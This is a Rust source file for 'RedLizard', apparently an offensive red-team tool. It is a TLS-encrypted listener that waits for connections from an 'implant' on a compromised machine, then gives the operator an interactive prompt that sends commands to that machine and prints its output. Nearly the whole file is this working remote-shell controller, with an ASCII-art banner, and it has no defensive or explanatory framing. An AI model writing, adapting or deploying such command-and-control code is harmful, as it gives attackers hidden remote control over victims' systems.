extern crate colored;
use colored::Colorize;
use std::io;
use std::env;
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::thread;
use openssl::ssl::{SslMethod, SslAcceptor, SslStream, SslFiletype};
use std::sync::Arc;

fn handle_client(mut stream: SslStream<TcpStream>) {
    println!("[+] Implant Armed.");
    loop {
        print!("Implant:~$ ");
        io::stdout().flush().expect("failed to get it");
        let mut input = String::new();
        io::stdin().read_line(&mut input);
        let buf = input.split_whitespace().collect::<Vec<_>>();
        stream.write(&mut input.as_bytes()).unwrap();
        let mut data = [0 as u8; 10024];
        stream.read(&mut data);
        let string = String::from_utf8_lossy(&data);
        println!("{}", string);
    }
}


fn main() {
    let args: Vec<String> = env::args().collect();
    let port = &args[1];
    let mut complete = "0.0.0.0:".to_string();
    complete.push_str(&port);
    let mut acceptor = SslAcceptor::mozilla_intermediate(SslMethod::tls()).unwrap();
    acceptor.set_private_key_file("server.key", SslFiletype::PEM).unwrap();
    acceptor.set_certificate_chain_file("server.crt").unwrap(); 
    acceptor.check_private_key().unwrap();
    let acceptor = Arc::new(acceptor.build());
    let listener2 = TcpListener::bind(&complete).unwrap();
    println!("{}", r" \ \ \ \ \ \ \ \ \| |\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \| |\ \ \ \ \ \ \ \ \ 
/ / / / / / / / / | | / / / / / / __  / / / / / / / / | | / / / / / / / / /
 \ \ \ \ \ \ \ \ \| |\ \ \ \ \   /..\  ` ` \ \ \ \ \ \| |\ \ \ \ \ \ \ \ \ 
------------------' `---------- (    ) \|/ -----------' `------------------
 ,------------------------- _\___>  <__//` ------------------------------. 
 |/ / / / / / / / / / / / / >,---.   ,-'  / / / / / / / / / / / / / / / /| 
 | \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ |  . \  \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ | 
 |/ / / / / / / / / / / / / / /  `. `. \   ., / / / / / / / / / / / / / /| 
 | \ \ \ \ \ \ \ \ \ \ \ \ \ \ \  |  `. | \||_ \ \ \ \ \ \ \ \ \ \ \ \ \ | 
 |/ / / / / / / / / / / / / / / / `.  : |__||   / / / / / / / / / / / / /| 
 | \ \ \ \ \ \ \ \ \ \ \ \ \ \ \  __> `.,---'  \ \ \ \ \ \ \ \ \ \ \ \ \ | 
 |/ / / / / / / / / / / / / / /  |.--'\`.\  / / / / / / / / / / / / / / /| 
 `------------------------------ _\\   \`.| -----------------------------' 
------------------. ,------------ /|\ - |:| ----------. ,------------------
 \ \ \ \ \ \ \ \ \| |\ \ \ \ \ \ ' `    |:|  \ \ \ \ \| |\ \ \ \ \ \ \ \ \ 
/ / / / / / / / / | | / / / / / / / / / |:| / / / / / | | / / / / / / / / /
 \ \ \ \ \ \ \ \ \| |\ \ \ \ \ \ \ \ \  |:/  \ \ \ \ \| |\ \ \ \ \ \ \ \ \ 
/ / / / / / / / / | | / /  --.________,-_/  / / / / / | | / / / / / / / / /
 \ \ \ \ \ \ \ \ \| |\ \ \ \ \ ```-----' \ \ \ \ \ \ \| |\ \ \ \ \ \ \ \ \ ".red());
    println!("\n[+] Welcome to RedLizard - trickster0 \n");
    // accept connections and process them, spawning a new thread for each one
    println!("[+] Server listening on port {}",&port);
    for stream2 in listener2.incoming() {
        match stream2 {
            Ok(stream2) => {
                println!("New connection: {}", stream2.peer_addr().unwrap());
                let acceptor = acceptor.clone();
                thread::spawn(move || {
                    // connection succeeded
                    let stream2 = acceptor.accept(stream2).unwrap();
                    handle_client(stream2)
                });
            }
            Err(e) => {
                println!("Error: {}", e);
                /* connection failed */
            }
        }
    }
}
